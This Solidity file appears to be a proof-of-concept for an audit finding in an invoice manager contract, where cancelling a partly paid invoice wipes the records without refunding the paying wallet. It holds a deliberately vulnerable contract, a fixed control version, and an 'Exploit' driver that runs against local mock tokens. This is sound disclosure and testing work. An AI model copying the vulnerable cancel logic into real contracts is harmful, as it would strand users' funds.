// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Etherspot finding 62849 (H-02):
// "Paid Tokens by Smart Contract Wallets Are Not Refunded When Cancelling Invoice".
//
// InvoiceManager runs a two-phase cross-chain settlement:
//   1. createInvoice        — records the expected token amounts for a sessionKey.
//   2. claim / credit       — the smart-contract wallet (SCW) physically transfers
//                             tokens INTO InvoiceManager, then the module calls
//                             creditTokensToInvoice() to record the received amount.
//   3. settleInvoice        — pays the credited tokens to the solver, but ONLY if
//                             EVERY token is fully credited; otherwise it reverts
//                             (IM_InvoiceNotFullyCredited).
//
// If the session expires after a PARTIAL claim, the invoice can never be fully
// credited, so settleInvoice is permanently blocked. A SETTLER then calls
// cancelInvoice() to clean up — but cancelInvoice merely DELETES all accounting
// (invoices / invoiceTokenData / bidHash / solver set) and NEVER refunds the
// tokens the SCW already paid in. The tokens physically remain in InvoiceManager;
// the only exit is emergencyWithdraw(), which sweeps to the admin (msg.sender),
// not back to the paying wallet. The SCW's partial payment is permanently lost.
//
// The vulnerable cancelInvoice / creditTokensToInvoice / settle credit-check /
// emergencyWithdraw are inlined VERBATIM from the audited commit:
//   github.com/etherspot/etherspot-modular-accounts
//   @ 9019f2a78c36e74bdb1df4029672998cb4631162
//   src/invoice_manager/InvoiceManager.sol  (cancelInvoice L232-245)
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal IERC20 surface used by emergencyWithdraw (opaque token boundary).
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

/// @dev Minimal faithful ERC20 double. Holds the SCW's paid tokens; the marker
///      token records the harm magnitude to the SINK.
contract MiniToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev Faithful minimal double for a smart-contract wallet. When the SCW "claims",
///      it transfers its tokens into InvoiceManager (the real claim() does
///      safeTransferFrom(wallet, invoiceManager, amount)); this debits the wallet.
contract SmartWallet {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    /// @notice Pay `amount` of `token` into `to` (InvoiceManager). Debits this wallet.
    function pay(address token, address to, uint256 amount) external {
        require(msg.sender == owner, "not owner");
        IERC20(token).transfer(to, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. The buggy cancelInvoice (and the surrounding two-phase
// accounting it operates on) is inlined VERBATIM from the audited source.
// The AccessControl / solver-set machinery is reduced to faithful minimal doubles
// (they are not the vulnerable boundary).
// ─────────────────────────────────────────────────────────────────────────────
contract InvoiceManager {
    // ── verbatim struct layout (IInvoiceManager) ──
    struct InvoiceData {
        address smartWallet;
        address sessionKey;
        address solver;
        bytes32 bidHash;
        uint256 chainId;
    }

    struct Invoice {
        InvoiceData data;
        uint256 createdAt;
        uint256 pulseFee;
    }

    struct InvoiceTokenData {
        address token;
        uint256 amount;
        uint256 creditedAmount;
    }

    // ── verbatim role constants ──
    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;
    bytes32 public constant CREDIBLE_ACCOUNT_ROLE = keccak256("CREDIBLE_ACCOUNT_ROLE");
    bytes32 public constant SETTLER_ROLE = keccak256("SETTLER_ROLE");

    // ── verbatim mappings ──
    mapping(address => Invoice) public invoices;
    mapping(bytes32 => address) public bidHashToSessionKey;
    mapping(address => InvoiceTokenData[]) public invoiceTokenData;

    // faithful minimal doubles for the AccessControl + solver registry boundary
    mapping(bytes32 => mapping(address => bool)) private _roles;
    mapping(address => mapping(address => bool)) private _solverHasInvoice;

    // ── verbatim errors (subset touched by the exploit path) ──
    error IM_MissingRole(bytes32 role, address account);
    error IM_InvoiceNotFound();
    error IM_InvalidTokenAmount();
    error IM_InsufficientContractBalance(address token, uint256 requiredAmount, uint256 availableBalance);
    error IM_UnauthorizedSettler(address caller, address sessionKey);
    error IM_TokenNotFoundInInvoice(address sessionKey, address token);
    error IM_TokenAlreadyCredited(address sessionKey, address token);
    error IM_TokenOverCredited(address sessionKey, address token, uint256 expected, uint256 attempted);
    error IM_InvoiceNotFullyCredited(address sessionKey, address token, uint256 expected, uint256 credited);

    // ── verbatim events (subset) ──
    event TokensCreditedToInvoice(address indexed sessionKey, address indexed token, uint256 amount);
    event InvoiceCancelled(address indexed sessionKey, string reason);

    // faithful minimal double for OZ AccessControl's onlyRole
    modifier onlyRole(bytes32 role) {
        if (!_roles[role][msg.sender]) revert IM_MissingRole(role, msg.sender);
        _;
    }

    function hasRole(bytes32 role, address account) public view returns (bool) {
        return _roles[role][account];
    }

    function _grantRole(bytes32 role, address account) internal {
        _roles[role][account] = true;
    }

    // faithful minimal double for SolverManager's active-invoice set
    function _removeSolverInvoice(address _solver, address _sessionKey) internal {
        _solverHasInvoice[_solver][_sessionKey] = false;
    }

    function _addSolverInvoice(address _solver, address _sessionKey) internal {
        _solverHasInvoice[_solver][_sessionKey] = true;
    }

    // verbatim modifier from InvoiceManager.sol
    modifier onlySettlerOrLinkedWallet(address _sessionKey) {
        // Check if caller has SETTLER_ROLE
        bool hasSettlerRole = hasRole(SETTLER_ROLE, msg.sender);
        // Check if caller is the smart wallet linked to the session key
        bool isLinkedWallet = false;
        if (_sessionKey != address(0)) {
            // Get the invoice data for this session key
            InvoiceData memory invoiceData = invoices[_sessionKey].data;
            isLinkedWallet = (msg.sender == invoiceData.smartWallet);
        }
        if (!hasSettlerRole && !isLinkedWallet) {
            revert IM_UnauthorizedSettler(msg.sender, _sessionKey);
        }
        _;
    }

    constructor(address _owner, address _credibleAccountModule) {
        _grantRole(DEFAULT_ADMIN_ROLE, _owner);
        _grantRole(CREDIBLE_ACCOUNT_ROLE, _credibleAccountModule);
        _grantRole(SETTLER_ROLE, _owner);
    }

    /// @notice Faithful minimal reduction of createInvoice + _createAndStoreInvoice:
    ///         records the expected token amount (creditedAmount 0) for a sessionKey.
    ///         The smartWallet is stored in InvoiceData (the fix refunds it here).
    function createInvoice(
        address _sessionKey,
        address _smartWallet,
        address _solver,
        bytes32 _bidHash,
        address _token,
        uint256 _amount
    ) external onlyRole(CREDIBLE_ACCOUNT_ROLE) {
        Invoice storage invoice = invoices[_sessionKey];
        invoice.data = InvoiceData({
            smartWallet: _smartWallet,
            sessionKey: _sessionKey,
            solver: _solver,
            bidHash: _bidHash,
            chainId: 0
        });
        invoice.createdAt = block.timestamp;
        invoiceTokenData[_sessionKey].push(
            InvoiceTokenData({token: _token, amount: _amount, creditedAmount: 0})
        );
        bidHashToSessionKey[_bidHash] = _sessionKey;
        _addSolverInvoice(_solver, _sessionKey);
    }

    // ─────────────── VERBATIM from InvoiceManager.sol L190-223 ───────────────
    function creditTokensToInvoice(address _sessionKey, address _token, uint256 _amount)
        external
        onlyRole(CREDIBLE_ACCOUNT_ROLE)
    {
        Invoice storage invoice = invoices[_sessionKey];
        if (invoice.createdAt == 0) revert IM_InvoiceNotFound();

        InvoiceTokenData[] storage tokenData = invoiceTokenData[_sessionKey];
        bool tokenFound = false;
        uint256 tokenIndex;

        for (uint256 i; i < tokenData.length; ++i) {
            if (tokenData[i].token == _token) {
                tokenFound = true;
                tokenIndex = i;
                break;
            }
        }

        if (!tokenFound) revert IM_TokenNotFoundInInvoice(_sessionKey, _token);

        // Check if adding this amount would exceed expected
        uint256 newCreditedAmount = tokenData[tokenIndex].creditedAmount + _amount;
        if (newCreditedAmount > tokenData[tokenIndex].amount) {
            revert IM_TokenOverCredited(_sessionKey, _token, tokenData[tokenIndex].amount, newCreditedAmount);
        }
        if (tokenData[tokenIndex].creditedAmount == tokenData[tokenIndex].amount) {
            revert IM_TokenAlreadyCredited(_sessionKey, _token);
        }

        // 4. if checks passed then attribute to invoice
        tokenData[tokenIndex].creditedAmount = newCreditedAmount;
        emit TokensCreditedToInvoice(_sessionKey, _token, _amount);
    }

    /// @notice Settlement is blocked whenever ANY token is not fully credited.
    ///         The credit-check loop below is VERBATIM from InvoiceManager.sol L159-165.
    function settleInvoice(address _sessionKey) external onlySettlerOrLinkedWallet(_sessionKey) {
        Invoice storage invoice = invoices[_sessionKey];
        if (invoice.createdAt == 0) revert IM_InvoiceNotFound();

        InvoiceTokenData[] storage tokens = invoiceTokenData[_sessionKey];
        uint256 tokensLength = tokens.length;

        for (uint256 i; i < tokensLength; ++i) {
            if (tokens[i].creditedAmount != tokens[i].amount) {
                revert IM_InvoiceNotFullyCredited(
                    _sessionKey, tokens[i].token, tokens[i].amount, tokens[i].creditedAmount
                );
            }
        }

        // (full-credit path) pay the credited tokens to the solver, then clean up.
        address solver = invoice.data.solver;
        for (uint256 i; i < tokensLength; ++i) {
            IERC20(tokens[i].token).transfer(solver, tokens[i].amount);
        }
        delete bidHashToSessionKey[invoice.data.bidHash];
        delete invoices[_sessionKey];
        delete invoiceTokenData[_sessionKey];
        _removeSolverInvoice(solver, _sessionKey);
    }

    // ─────────────── VERBATIM from InvoiceManager.sol L232-245 ───────────────
    function cancelInvoice(address _sessionKey, string calldata _reason) external onlyRole(SETTLER_ROLE) {
        Invoice storage invoice = invoices[_sessionKey];
        if (invoice.createdAt == 0) revert IM_InvoiceNotFound();

        bytes32 bidHash = invoice.data.bidHash;
        address solver = invoice.data.solver;

        delete invoices[_sessionKey];
        delete invoiceTokenData[_sessionKey]; // @> wipes all credited-token accounting; tokens the SCW already paid in are NEVER refunded
        delete bidHashToSessionKey[bidHash];
        _removeSolverInvoice(solver, _sessionKey);

        emit InvoiceCancelled(_sessionKey, _reason);
    }

    // ─────────────── VERBATIM from InvoiceManager.sol L272-279 ───────────────
    // The only exit for stranded tokens: sweeps to the admin (msg.sender), NOT
    // back to the paying smart wallet. Not a refund path for the SCW.
    function emergencyWithdraw(address _token, uint256 _amount) external onlyRole(DEFAULT_ADMIN_ROLE) {
        if (_amount == 0) revert IM_InvalidTokenAmount();
        uint256 contractBalance = IERC20(_token).balanceOf(address(this));
        if (contractBalance < _amount) {
            revert IM_InsufficientContractBalance(_token, _amount, contractBalance);
        }
        IERC20(_token).transfer(msg.sender, _amount);
    }

    function invoiceExists(address _sessionKey) external view returns (bool) {
        return invoices[_sessionKey].createdAt != 0;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (negative control): cancelInvoice refunds every credited amount
// to the invoice's stored smartWallet before deleting the accounting.
// ─────────────────────────────────────────────────────────────────────────────
contract InvoiceManagerFixed {
    struct InvoiceData {
        address smartWallet;
        address sessionKey;
        address solver;
        bytes32 bidHash;
        uint256 chainId;
    }

    struct Invoice {
        InvoiceData data;
        uint256 createdAt;
        uint256 pulseFee;
    }

    struct InvoiceTokenData {
        address token;
        uint256 amount;
        uint256 creditedAmount;
    }

    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;
    bytes32 public constant CREDIBLE_ACCOUNT_ROLE = keccak256("CREDIBLE_ACCOUNT_ROLE");
    bytes32 public constant SETTLER_ROLE = keccak256("SETTLER_ROLE");

    mapping(address => Invoice) public invoices;
    mapping(bytes32 => address) public bidHashToSessionKey;
    mapping(address => InvoiceTokenData[]) public invoiceTokenData;

    mapping(bytes32 => mapping(address => bool)) private _roles;
    mapping(address => mapping(address => bool)) private _solverHasInvoice;

    error IM_MissingRole(bytes32 role, address account);
    error IM_InvoiceNotFound();

    event TokensRefundedOnCancel(address indexed sessionKey, address indexed smartWallet, address token, uint256 amount);
    event InvoiceCancelled(address indexed sessionKey, string reason);

    modifier onlyRole(bytes32 role) {
        if (!_roles[role][msg.sender]) revert IM_MissingRole(role, msg.sender);
        _;
    }

    function _grantRole(bytes32 role, address account) internal {
        _roles[role][account] = true;
    }

    function _removeSolverInvoice(address _solver, address _sessionKey) internal {
        _solverHasInvoice[_solver][_sessionKey] = false;
    }

    function _addSolverInvoice(address _solver, address _sessionKey) internal {
        _solverHasInvoice[_solver][_sessionKey] = true;
    }

    constructor(address _owner, address _credibleAccountModule) {
        _grantRole(DEFAULT_ADMIN_ROLE, _owner);
        _grantRole(CREDIBLE_ACCOUNT_ROLE, _credibleAccountModule);
        _grantRole(SETTLER_ROLE, _owner);
    }

    function createInvoice(
        address _sessionKey,
        address _smartWallet,
        address _solver,
        bytes32 _bidHash,
        address _token,
        uint256 _amount
    ) external onlyRole(CREDIBLE_ACCOUNT_ROLE) {
        Invoice storage invoice = invoices[_sessionKey];
        invoice.data = InvoiceData({
            smartWallet: _smartWallet,
            sessionKey: _sessionKey,
            solver: _solver,
            bidHash: _bidHash,
            chainId: 0
        });
        invoice.createdAt = block.timestamp;
        invoiceTokenData[_sessionKey].push(
            InvoiceTokenData({token: _token, amount: _amount, creditedAmount: 0})
        );
        bidHashToSessionKey[_bidHash] = _sessionKey;
        _addSolverInvoice(_solver, _sessionKey);
    }

    function creditTokensToInvoice(address _sessionKey, address _token, uint256 _amount)
        external
        onlyRole(CREDIBLE_ACCOUNT_ROLE)
    {
        Invoice storage invoice = invoices[_sessionKey];
        if (invoice.createdAt == 0) revert IM_InvoiceNotFound();
        InvoiceTokenData[] storage tokenData = invoiceTokenData[_sessionKey];
        for (uint256 i; i < tokenData.length; ++i) {
            if (tokenData[i].token == _token) {
                tokenData[i].creditedAmount += _amount;
                return;
            }
        }
    }

    // FIX: refund every credited amount to the original smartWallet before deleting.
    function cancelInvoice(address _sessionKey, string calldata _reason) external onlyRole(SETTLER_ROLE) {
        Invoice storage invoice = invoices[_sessionKey];
        if (invoice.createdAt == 0) revert IM_InvoiceNotFound();

        bytes32 bidHash = invoice.data.bidHash;
        address solver = invoice.data.solver;
        address smartWallet = invoice.data.smartWallet;

        InvoiceTokenData[] storage tokens = invoiceTokenData[_sessionKey];
        for (uint256 i; i < tokens.length; ++i) {
            uint256 credited = tokens[i].creditedAmount;
            if (credited > 0) {
                IERC20(tokens[i].token).transfer(smartWallet, credited);
                emit TokensRefundedOnCancel(_sessionKey, smartWallet, tokens[i].token, credited);
            }
        }

        delete invoices[_sessionKey];
        delete invoiceTokenData[_sessionKey];
        delete bidHashToSessionKey[bidHash];
        _removeSolverInvoice(solver, _sessionKey);

        emit InvoiceCancelled(_sessionKey, _reason);
    }

    function invoiceExists(address _sessionKey) external view returns (bool) {
        return invoices[_sessionKey].createdAt != 0;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: SCW partially pays an invoice; the session expires so settle is
// permanently blocked; the SETTLER cancels; the SCW's partial payment is wiped
// from accounting and stays locked in InvoiceManager with no refund path.
// The locked magnitude is recorded on a MARKER token minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    // Session / party addresses (deterministic literals for readability).
    address internal constant SESSION_KEY = 0x0000000000000000000000000000000000005151;
    address internal constant SOLVER = 0x0000000000000000000000000000000000050100;
    bytes32 internal constant BID_HASH = keccak256("bid-62849");

    uint256 internal constant EXPECTED_TOTAL = 100 ether; // full invoice amount
    uint256 internal constant PARTIAL_PAID = 40 ether;    // SCW's partial claim before session expiry

    // Exposed results for the driver / Playground.
    uint256 public buggyWalletDebited;   // tokens the SCW lost
    uint256 public buggyImHeld;          // tokens still stuck in InvoiceManager after cancel
    bool public buggyInvoiceExists;      // accounting after cancel (false = wiped)
    bool public settleReverted;          // settle was blocked (partial credit)
    uint256 public strandedLocked;       // the permanently locked magnitude
    uint256 public sinkMarkerBalance;

    address public imAddr;
    address public tokenAddr;
    address public walletAddr;
    address public markerAddr;

    function run() external payable {
        // --- deploy doubles + the vulnerable InvoiceManager (fixed order) ---
        MiniToken token = new MiniToken("USD Coin", "USDC");            // nonce 1
        SmartWallet wallet = new SmartWallet(address(this));           // nonce 2
        // Exploit plays the trusted infra roles: admin + settler + credible module.
        InvoiceManager im = new InvoiceManager(address(this), address(this)); // nonce 3
        MiniToken marker = new MiniToken("Locked-USDC", "LOCKED-USDC"); // nonce 4 (LAST)

        imAddr = address(im);
        tokenAddr = address(token);
        walletAddr = address(wallet);
        markerAddr = address(marker);

        // --- fund the SCW with the tokens it will pay in ---
        token.mint(address(wallet), PARTIAL_PAID);

        // === STEP 1: module creates the invoice (expects EXPECTED_TOTAL) ===
        im.createInvoice(SESSION_KEY, address(wallet), SOLVER, BID_HASH, address(token), EXPECTED_TOTAL);

        // === STEP 2: SCW performs a PARTIAL claim (session expires before the rest) ===
        //     Real claim() does safeTransferFrom(wallet, invoiceManager, amount); here the
        //     wallet transfers PARTIAL_PAID in and the module credits that amount.
        wallet.pay(address(token), address(im), PARTIAL_PAID);
        im.creditTokensToInvoice(SESSION_KEY, address(token), PARTIAL_PAID);

        // === STEP 3: settle is permanently blocked (creditedAmount != amount) ===
        try im.settleInvoice(SESSION_KEY) {
            settleReverted = false;
        } catch {
            settleReverted = true;
        }

        // === STEP 4: SETTLER cancels the stuck invoice — VERBATIM buggy path ===
        im.cancelInvoice(SESSION_KEY, "session expired; partial payment");

        // === HARM: SCW debited, tokens locked in InvoiceManager, accounting wiped ===
        buggyWalletDebited = PARTIAL_PAID - token.balanceOf(address(wallet)); // == PARTIAL_PAID
        buggyImHeld = token.balanceOf(address(im));                          // == PARTIAL_PAID
        buggyInvoiceExists = im.invoiceExists(SESSION_KEY);                  // false (accounting gone)
        strandedLocked = buggyImHeld;

        require(buggyWalletDebited == PARTIAL_PAID, "SCW must be debited its full partial payment");
        require(buggyImHeld == PARTIAL_PAID, "tokens must remain locked in InvoiceManager");
        require(!buggyInvoiceExists, "invoice accounting must be wiped by cancel (no refund record)");
        require(settleReverted, "settle must be blocked for a partial invoice");

        // Record the locked magnitude on the marker token to the SINK.
        marker.mint(SINK, strandedLocked);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
